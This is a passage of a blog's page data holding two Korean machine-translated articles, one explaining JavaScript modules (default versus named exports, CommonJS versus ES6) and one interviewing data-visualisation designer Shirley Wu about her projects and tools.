사용할 수 있습니다.\n- 기본 내보내기를 가져올 때는 중괄호 '{}'가 필요하지 않습니다.\n- 모듈당 기본 내보내기는 하나만 가질 수 있습니다.\n\n예시:\n\n```js\n// ModuleA.js\nconst value = 'Hello';\nexport default value;\n```  \n\n<div class=\"content-ad\"></div>\n\n```js\n// ModuleB.js\nimport myValue from './ModuleA.js';\nconsole.log(myValue); // 출력: Hello\n```\n\n2. `export default` 없이 (이름 있는 수출):\n\n- 이름 있는 수출을 사용하면 모듈에서 여러 값을 내보낼 수 있습니다.\n- 이름 있는 수출을 가져올 때 내보낸 값과 동일한 이름을 사용해야 합니다.\n- 이름 있는 수출을 가져올 때 중괄호 `{}`를 사용해야 합니다.\n- 모듈 당 여러 이름 있는 수출을 가질 수 있습니다.\n\n예시:\n\n<div class=\"content-ad\"></div>\n\n\n// ModuleA.js\nexport const value1 = 'Hello';\nexport const value2 = 'World';\n\n\n\n// ModuleB.js\nimport { value1, value2 } from './ModuleA.js';\nconsole.log(value1); // Output: Hello\nconsole.log(value2); // Output: World\n\n\n요약하면, export default는 모듈에서 단일 값을 지정하지 않고 내보내는 데 사용되며, named exports는 여러 값을 내보내는 데 사용되며 가져올 때 동일한 이름을 지정해야 합니다. 특정 프로젝트 요구에 따라 유용하게 사용됩니다.\n\nCommonJS와 ES6 모듈을 예제와 함께 비교하여 그 차이를 설명해 보겠습니다:\n\n\n<div class=\"content-ad\"></div>\n\n1. CommonJS:\n\n- CommonJS는 주로 서버 측 개발을 위해 Node.js에서 사용되는 모듈 시스템입니다. 이는 동기적이며 블로킹 방식으로, 모듈은 런타임에서 동기적으로 로드됩니다.\n\nCommonJS 예제:\n\n```js\n// ModuleA.js\nconst greeting = 'Hello';\nfunction sayHello() {\n  console.log(greeting);\n}\nmodule.exports = {\n  greeting,\n  sayHello\n};\n```\n\n<div class=\"content-ad\"></div>\n\n```js\r\n// ModuleB.js\nconst moduleA = require('./ModuleA');\nmoduleA.sayHello(); // Output: Hello\nconsole.log(moduleA.greeting); // Output: Hello\r\n```\n\n2. ES6 Modules:\n\n- ES6 modules are a newer module system introduced in ECMAScript 2015 (ES6). They are asynchronous and support both synchronous and asynchronous module loading.\n\nExample with ES6 Modules:\n\n<div class=\"content-ad\"></div>\n\n```js\n// ModuleA.js\nconst greeting = 'Hello';\nexport function sayHello() {\n  console.log(greeting);\n}\nexport { greeting };\n```\n\n```js\n// ModuleB.js\nimport { sayHello, greeting } from './ModuleA.js';\nsayHello(); // 출력: Hello\nconsole.log(greeting); // 출력: Hello\n```\n\n비교:\n\n동기 vs. 비동기:\n\n<div class=\"content-ad\"></div>\n\n- CommonJS 모듈은 동기적이고 블로킹이며, 실행 시 동기적으로 로드됩니다. 이는 서버 측 프로그래밍과 잘 어울리며, 블로킹 I/O 작업이 일반적인 경우에 적합합니다.\n  \n- ES6 모듈은 구현에 따라 동기적이거나 비동기적일 수 있습니다. 더 유연하며 서버 측 및 클라이언트 측 환경에서 모두 사용할 수 있습니다.\n\n사용 편의성:\n\n- CommonJS 모듈은 module.exports 및 require()를 사용하여 각각 기능을 내보내고 가져옵니다. 이 구문은 직관적이며 이해하기 쉽습니다.\n  \n- ES6 모듈은 export 및 import 문을 사용하여 기능을 내보내고 가져옵니다. 이 구문은 더 현대적이고 언어 명세와 일치하지만, 아직 ES6 모듈을 네이티브로 지원하지 않는 환경에서 변환을 위한 추가 도구가 필요할 수 있습니다.\n\n브라우저 호환성:\n\n<div class=\"content-ad\"></div>\n\n- CommonJS 모듈은 브라우저에서 네이티브로 지원되지 않습니다. CommonJS 코드를 브라우저가 이해할 수 있는 형식으로 변환하기 위해 Browserify나 Webpack과 같은 번들러가 필요합니다.\n- ES6 모듈은 최신 브라우저에서 지원되며 많은 경우 추가 도구 없이 네이티브로 사용할 수 있습니다. 그러나 오래된 브라우저에서 ES6 모듈을 지원하기 위해서는 Babel과 같은 도구를 사용하여 트랜스 파일링이 필요할 수 있습니다.\n\n서버 측 사용 사례:\n\n- Node.js는 주로 서버 측 프로그래밍에 사용되며, 동기적인 성격과 쉬운 사용성 때문에 CommonJS 모듈이 잘 어울립니다. 런타임에서 모듈을 동기적으로 로드할 수 있으며, 서버는 모듈이 로드된 후에 실행을 계속할 수 있습니다.\n- 브라우저 환경에서는 JavaScript 코드가 클라이언트 측에서 실행되며, 응답성을 보장하고 UI 쓰레드를 차단하지 않기 위해 비동기 작업이 선호됩니다. 따라서 웹 개발에서는 비동기적 모듈 로딩을 지원하는 AMD (Asynchronous Module Definition) 또는 ES6 모듈과 같은 다른 모듈 시스템이 일반적으로 사용됩니다.\n\n성능 고려 사항:\n\n<div class=\"content-ad\"></div>\n\n- CommonJS 모듈은 동기적으로 로드되어 브라우저 환경에서 특히 많은 모듈이 있는 대규모 웹 애플리케이션의 성능에 영향을 미칠 수 있습니다. 동기적 모듈 로딩은 페이지 로드 시간이 더 느려지고 응답성이 감소할 수 있습니다.\n- 다른 모듈 시스템인 AMD나 ES6 모듈에서 지원하는 비동기 모듈 로딩은 모듈이 병렬로 로드되도록 허용하여 모듈 종속성을 로드하는 데 걸리는 시간을 줄여 성능을 향상시킵니다.\n\n요약하면, CommonJS 모듈은 동기적 특성과 사용 편의성으로 인해 Node.js에서 서버 측 개발에 적합합니다. ES6 모듈은 더 많은 다양성을 제공하며 남종적 및 클라이언트 측 개발에서 점점 더 채택되고 있으며 비동기 모듈 로딩 및 현대적 구문을 지원합니다.","ogImage":{"url":"/assets/img/2024-06-27-YoudontknowJSPart1UnderstandingScopeClosureHoistingModules_0.png"},"coverImage":"/assets/img/2024-06-27-YoudontknowJSPart1UnderstandingScopeClosureHoistingModules_0.png","tag":["Tech"],"readingTime":15},{"title":"아름다운 데이터 시각화를 디자인하는 방법 Shirley Wu와의 인터뷰","description":"","date":"2024-06-27 18:14","slug":"2024-06-27-DesigningBeautifulDataVisualisationsAnInterviewwithShirleyWu","content":"\n\n## 셜리 우는 인기 있는 Data Sketches 프로젝트의 절반으로, 매우 상호 작용적인 데이터 시각화와 데이터 주도적 예술을 만들어냅니다. 여기서 그녀는 뒷면을 엿보게 해주며 배운 교훈을 공유합니다\n\n![이미지](/assets/img/2024-06-27-DesigningBeautifulDataVisualisationsAnInterviewwithShirleyWu_0.png)\n\n셜리 우는 샌프란시스코의 대형 데이터 회사에서 프런트엔드 소프트웨어 엔지니어로 일했을 때 데이터 시각화 JavaScript 라이브러리인 D3.js를 알게 되었습니다. 그 도구를 사랑하게 된 이유는 그것이 그녀의 두 가지 주요 관심사인 미술 - 셜리는 네 살 때 그림과 그림을 시작했습니다 - 그리고 수학을 결합했기 때문입니다. 그녀가 트위터에서 자신을 코드 ¾ 및 예술 ¼로 설명하는 것도 놀랍지 않습니다.\n\n대학을 졸업한 지 4년만에 셜리는 독립을 택하고 데이터 시각화를 전문으로 하는 프리랜서가 되었습니다. 그녀는 문화, 정치, 예술 등 다양한 주제를 다루는 다양한 주제를 시각화합니다. 셜리는 자신의 경력에 큰 영향을 미친 세 가지 프로젝트를 2017년에 발표했습니다. 첫 번째는 Daata Sketches [최근 책으로 출간됨]로, 암스테르담의 데이터 시각화 디자이너 나디에 브레먀와의 협업으로, 이는 두 사람을 데이터 시각화 커뮤니티에 소개했습니다. 매월 주제를 선택하여 시각화를 만들고, 전체 프로세스 - 데이터 준비, 아이디어 스케치 및 실행까지 - 을 문서화하는 것이 아이디어였습니다.\n\n<div class=\"content-ad\"></div>\n\n\"라이트업들은 그냥 생각의 흔적이었어요,\" Shirley는 기억합니다. \"하지만 그것이 사람들이 가장 좋아하는 것이 되었어요. 사람들이 와서 우리에게 말해주면서 '뒷이야기를 들여다보고 연출된 최종 결과물 이상의 변화를 볼 수 있어 얼마나 멋진지'라고 말해줍니다. 아주 빠르게 떠올린 아이디어였지만 프로젝트의 이름을 지정하는 데 오랜 시간이 걸렸어요. 우리는 수많은 이름으로 가득 찬 문서를 가지고 있어요. 그 중 하나인 '셜리와 나디의 시각화 마라톤 대모험'이 제일 좋아하는 이름 중 하나에요. 당연히, 그 이름은 선택하지 않았죠!\"\n\n셜리가 유명해지게 한 두 번째 프로젝트는 뮤지컬 '햄릴턴'의 모든 라인을 인터랙티브 시각화한 것이었어요. 이 프로젝트는 The Pudding을 위해 만들어진 것으로, 이는 문화에서 논의되는 아이디어들을 시각 산문으로 설명하는 온라인 출판물이고, 시갛 산문 스튜디오 Polygraph가 제작했어요. 이 프로젝트는 21,000단어를 관련성과 주제적 통찰을 분석하고 D3, React, HTML5 Canvas를 사용했는데, 이를 통해 셜리는 데이터 수집에 대해 호기심을 갖게 되고 창의적으로 활용하는 법을 배웠어요. 이 프로젝트는 2017년 '정보는 아름답다 어워드'의 예술, 엔터테인먼트 및 대중 문화 부문에서 동상을 수상했으며, Data Sketches는 '기이한 부문'에서 금상을 수상했어요.\n\n<img src=\"/assets/img/2024-06-27-DesigningBeautifulDataVisualisationsAnInterviewwithShirleyWu_1.png\" />\n\n# 효과적인 데이터 시각화 작성 과정\"\n\n<div class=\"content-ad\"></div>\n\n그때 구글이 찾아왔어요. 데이터 저널리스트 알베르토 카이로의 예술적인 지도 아래, 구글 뉴스 랩은 전 세계 최고의 데이터 시각화 디자이너들과 협력했어요. 카이로는 데이터 스케치를 발견하고 셜리를 초대하여 거의 40개국의 10년 간의 여행 검색을 조사하고 상위 검색 문화 장소를 탐험하도록 했어요( explore-adventure.com). 한편 브레머는 구글 번역을 통해 영어로 가장 많이 번역된 단어를 분석했죠(www.beautifulinenglish.com).\n\n이 프로젝트는 셜리가 포트폴리오를 굳혀 기회를 얻도록 도왔고, 그녀의 경력은 정말로 발전하기 시작했어요. 셜리는 더 많은 클라이언트를 유치했을 뿐만 아니라 데이터 시각화에 대해 이야기하기 시작했고, 일본, 네덜란드, 독일, 스페인 등 전 세계의 행사에서 워크샵도 진행하게 되었어요. 이야기하는 동안 실시간 코딩을 보여주며, D3가 보다 친근하다는 것을 보여주는 한편 데이터 시각화를 만드는 데는 많은 연습, 인내력, 그리고 인내심이 필요하다는 것도 보여주었죠. 또한 샌프란시스코 베이지역 D3.js 사용자 그룹을 공동 조직하고, Frontend Master를 위해 온라인 강좌를 제작하여 프론트엔드 개발자들에게 D3의 기초부터 분석 및 자체 맞춤 데이터 시각화 설계까지 알려주었어요.\n\n“클라이언트는 항상 데이터 세트를 가져옵니다.” 셜리는 그녀의 과정을 설명합니다. “그것으로 이야기를 전하거나, 탐험적인 것을 만들고 싶어해요. 대부분은 내부 비즈니스 분석이며, 그들은 고객이 왜 그러는지 알려고 노력하고 있어요. 제가 하는 첫 번째 일은 그들의 목표와 전달하려는 내용 또는 학습 목표를 분석하는 것입니다. 둘째, 그들의 대상 청중과 그 청중의 데이터 지식에 관해 물어봐요.”\n\n그 다음 셜리는 데이터, 디자인 및 코드 세 단계를 거칩니다. 먼저 데이터를 탐색하는 것이 중요하죠. 데이터 수집, 정리, 준비 및 분석에는 Node.js 패키지를 많이 사용합니다. 또한 더 복잡한 프로젝트를 위해 데이터 과학 배경을 가진 내이와 자주 협업합니다. 예를 들어, 수상 경력이 있는 '버스트 아웃(Bussed Out)'이란 미국의 무주택자에 대한 강력한 조사 기사로, 위 대가디언(The Guardian)의 조사론시한 작품에는 약 34,000명의 무주택자의 여정을 조사했죠. 시각화의 많은 부분은 '스크롤 스토리 telling 스타일'로 제작되어 있으며 페이지를 스크롤하면 애니메이션이 트리거됩니다.\n\n<div class=\"content-ad\"></div>\n\n# 펜과 종이에서 JavaScript로\n\n셜리가 데이터와 클라이언트의 목표를 이해하면 펜과 종이, 아이패드를 사용하여 아이디어를 디자인하고 스케치하며 종종 시각적 은유를 활용합니다. 최근에는 Mike Bostock과 함께 만든 대화형 JavaScript 노트북 플랫폼 인 Observable을 사용하기 시작했습니다. 이 플랫폼은 데이터 분석, 시각화 및 탐색에 사용되며 시각화 생성 및 데이터에 대한 가설을 확인 또는 반박하기 위해 시각적 결과를 빠르게 생성하는 Vega-Lite 차트 라이브러리와 함께 사용합니다. 클라이언트와의 상의를 통해 원하는 결과물을 도출할 때까지 이러한 도구를 반복적으로 활용하며, 코드 작성 시에는 D3, Vue 및 GreenSock Animation Platform (GSAP)를 주로 사용하고 있습니다. 또한 이야기를 할 수 있는 JavaScript 라이브러리 Scrollama를 활용하여 스크롤 기반 시각화에 대해 탐구하고 있습니다. 또한 SVG에 큰 관심을 가지고 있습니다.\n\nVue로 이동하기 전에는 React를 사용했던 셜리씨입니다. 그는 매우 늦게 채용된 사람이라고 말합니다. \"저는 관심 있는 몇 가지 도구에 집중합니다,\" 라고 설명합니다. \"이 모든 라이브러리는 그냥 도구상자 안의 도구일 뿐이라고 확신합니다. 작업을 완료하기 위해 필요한 최소한의 도구 집합을 이해하려고 합니다. 많은 사람들이 사용해야 한다고 말하기 전까지는 라이브러리를 사용하지 않습니다. 예를 들어, Sarah Drasner은 GreenSock을 소개해 주었고 그녀의 Intro to Vue.js 워크샵도 참여했습니다. 그리고 약 1년 반 동안 그녀와 몇몇 다른 분들이 Vue를 확인해보라고 권유했을 때, 마침내 확인했습니다! 이후로 모든 프로젝트에 Vue를 사용하고 있습니다. 상호작용하는 시각화 작업을 위해서 정말 많은 의미를 가지고 있습니다.\"\n\n프리랜서가 된 이후, 셜리는 기술 측면 뿐만 아니라 디자인도 발전시켰습니다. 이제는 최종 사용자를 더 많이 고려하며 데이터 시각화를 UI의 최고의 실천법과 결합시켜 작은 세부사항과 개인적인 요소를 첨가합니다.\n\n<div class=\"content-ad\"></div>\n\n“좋은 시각화를 만드는 요소, 사람들이 쉽게 읽을 수 있는 요소, 그리고 우리가 패턴을 인식하는 심리를 활용하는 방법을 배우고 싶었어요. 그래서 데이터 시각화 디자인에 관한 워크숍을 가르치기로 결정했죠. 그러다 몇 권의 책을 읽게 되었어요. 제가 가장 좋아하는 책 중 하나는 Alberto Cairo의 'The Functional Art'입니다. 매우 실용적이고 제 작업 방식을 많이 변화시켰어요.”\n\n# 3차원 데이터 시각화\n\n샤리는 처음으로 물리적 데이터 설치물에 도전했어요. 개념 예술가 Ekene Ijeoma의 2015년 작품인 'Wage Islands'를 보고 나서부터 언젠가 물리적인 작업을 하고 싶어했었어요. 이 작품은 뉴욕시의 지형지도를 검은 잉크로 수중에 가라앉혀 저임금 노동자가 어디서 지불 가능한 임대료를 지출할 수 있는지를 시각화해주는 상호작용 설치물입니다. 이를 통해 저렴한 주택 공급 위기에 대한 주목을 불러일으킵니다.\n\n“그것이 상호작용하는 3D 예술작품이었기 때문에 너무 놀랍더라고요,” 샤리가 말했습니다. “작은 휴대폰이나 데스크탑 화면을 넘어서는 무언가. 제가 물리적 데이터 시각화 아이디어에 진짜 열광하기 시작했어요.”\n\n<div class=\"content-ad\"></div>\n\n셜리는 모든 프로젝트가 2D로 구성되어 있음을 깨닫고, 물리적인 예술 작품을 만들고 싶다면 3차원으로 생각해야 한다는 것을 깨달았습니다. 그래서 Matt DesLauriers의 크리에이티브 코딩 워크샵을 수강하고 배운 기술을 활용하여 세 번째 프로젝트를 만들기 시작했어요. three.js와 WebGL로 구현된 \"Legends\"는 51명의 여성 노벨상 수상자와 그들의 업적을 3D 시각화한 작품입니다. 새로운 기술을 적용하면서 공간, 카메라 및 조명에 대해 많은 것을 배웠어요. 매 수상자는 그들의 위키피디아 페이지에서 추출된 데이터로 표현된 크리스탈로 나타납니다. 수상 카테고리로 색상이 지정되고, '영향'에 따라 크기가 조절되며, 상받은 연대에 따라 위치가 조정됩니다. 한편, 여러 별은 상을 수상한 853명의 남성을 나타냅니다.\n\n![이미지](/assets/img/2024-06-27-DesigningBeautifulDataVisualisationsAnInterviewwithShirleyWu_2.png)\n\n며칠 전에 셜리는 'Legends'를 수정하여 최근 30년 동안의 여성 노벨상 수상자를 나타내는 약간 축소된 물리적 버전을 제작했어요. 이는 창문 설치용으로 laser-cut 나무 꽃으로 표현된 29명의 여성 노벨상 수상자를 특징으로 합니다. 'Flower Power'는 셜리의 스튜디오 동료 앨리스 리와의 협업 작품이며, 독립 일러스트레이터, 예술가이자 2015년 넷 영 디자이너 오브 더 이어인 앨리스 리가 드롭박스, 에어비앤비, 애플 등과 함께 일해 온 경력을 바탕으로 만들어졌습니다. 이는 5x5라는 아트 쇼 및 팝업 샵의 일환으로, 샌프란시스코 미션 디스트릭트에 있는 1099 스튜디오의 다섯 거주자들이 다양한 매체로 구성된 다섯 개의 프로젝트를 선보이는 행사입니다.\n\n![이미지](/assets/img/2024-06-27-DesigningBeautifulDataVisualisationsAnInterviewwithShirleyWu_3.png)\n\n<div class=\"content-ad\"></div>\n\n세번째 디지털 3D 프로젝트는 three.js와 WebGL을 사용해 진행 중입니다. 한 예술 박물관에서 의뢰받아 Legends와 유사한 컨셉으로 홍콩의 여성 작가들을 산으로 표현할 예정입니다(아직 많은 데이터가 부족하다는 점에 주목합니다). 또한 뉴욕 대학교 대화형 통신 프로그램에서의 레지던시도 임박해 있습니다. Shirley의 목표는 자신에게 중요한 주제(예: 성별 균형)를 다루는 의미 있는 시각화를 지속적으로 만드는 것이며, 데이터를 정확하게 표현할 뿐만 아니라 오해할 수 없는 방식으로 표현하는 것입니다.\n\n\"데이터 시각화는 통계와 매우 닮았습니다,\" Shirley는 경계합니다. \"데이터가 올바르게 제시되지 않으면 누군가를 속이는 것이 매우 쉽습니다. 또한 데이터가 결정적이라고 생각하는 경향이 있습니다. 데이터가 말하는 대로라면, 반드시 맞는 것이지만, 대부분의 경우 데이터는 인간에 의해 수집되며 항상 인간적 편향이 있습니다. 아마 그것은 우리가 영원히 제거할 수 없는 것일 수도 있습니다. 그러한 편향을 어떻게 전달할 수 있는지는 정말 흥미로운 도전이 될 것입니다.\"\n\n본 기사는 2019년 net 매거진 321호에 실렸으며, Shirley의 Data Sketches 파트너 Nadieh Bremer 인터뷰도 참조하시기 바랍니다.","ogImage":{"url":"/assets/img/2024-06-27-DesigningBeautifulDataVisualisationsAnInterviewwithShirleyWu_0.png"},"coverImage":"/assets/img/2024-06-27-DesigningBeautifulDataVisualisationsAnInterviewwithShirleyWu_0.png","tag":["Tech"],"readingTime":7}],"page":"4","totalPageCount":156,"totalPageGroupCount":8,"lastPageGroup":20,"currentPageGroup":0},"__N_SSG":true}